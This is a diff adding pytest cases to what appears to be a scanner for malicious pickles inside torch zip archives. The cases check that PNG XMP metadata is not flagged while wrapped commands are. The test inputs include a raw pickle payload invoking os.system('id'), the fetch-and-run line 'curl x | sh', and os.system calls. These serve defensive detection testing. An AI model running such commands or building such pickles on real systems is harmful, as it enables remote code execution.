@@ -146,3 +146,29 @@ def test_javascript_in_a_nested_wheel_is_not_a_pickle(tmp_path):
 def test_protocol0_payload_in_a_nested_member_is_still_flagged(tmp_path):
     payload = b"cos\nsystem\n(S'id'\ntR."
     assert _worst_of(_nested_zip(tmp_path, "static/notes.txt", payload)) == "critical"
+
+
+# Third batch, from the retry of the torch zip sweep.
+
+def test_png_xmp_metadata_text_is_data(tmp_path):
+    # PIL keeps PNG text chunks as iTXt, a str subclass; XMP metadata is full of
+    # namespace URLs. Building one runs nothing.
+    xmp = '<x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"/></x:xmpmeta>'
+    assert not flagged(worst(tmp_path, build(Call("PIL.PngImagePlugin.iTXt", xmp, "", "XML:com.adobe.xmp"))))
+
+
+def test_command_wrapped_in_png_text_is_still_flagged(tmp_path):
+    for wrapper in ("PIL.PngImagePlugin.iTXt", "builtins.str"):
+        assert flagged(worst(tmp_path, build(Call("some.module.run", Call(wrapper, "curl x | sh"))))), wrapper
+        assert worst(tmp_path, build(Call("os.system", Call(wrapper, "id")))) == "critical", wrapper
+
+
+def test_command_inside_png_text_is_still_flagged(tmp_path):
+    assert flagged(worst(tmp_path, build(Call("PIL.PngImagePlugin.iTXt", "curl x | sh", "", ""))))
+    assert flagged(worst(tmp_path, build(Call("PIL.PngImagePlugin.iTXt", "os.system", "", ""))))
+
+
+def test_url_in_png_text_outside_a_namespace_is_still_flagged(tmp_path):
+    assert flagged(worst(tmp_path, build(Call("PIL.PngImagePlugin.iTXt", "https://example.invalid/p", "", ""))))
+    xmp = '<x:xmpmeta xmlns:x="adobe:ns:meta/"><a href="https://example.invalid/p"/></x:xmpmeta>'
+    assert flagged(worst(tmp_path, build(Call("PIL.PngImagePlugin.iTXt", xmp, "", ""))))
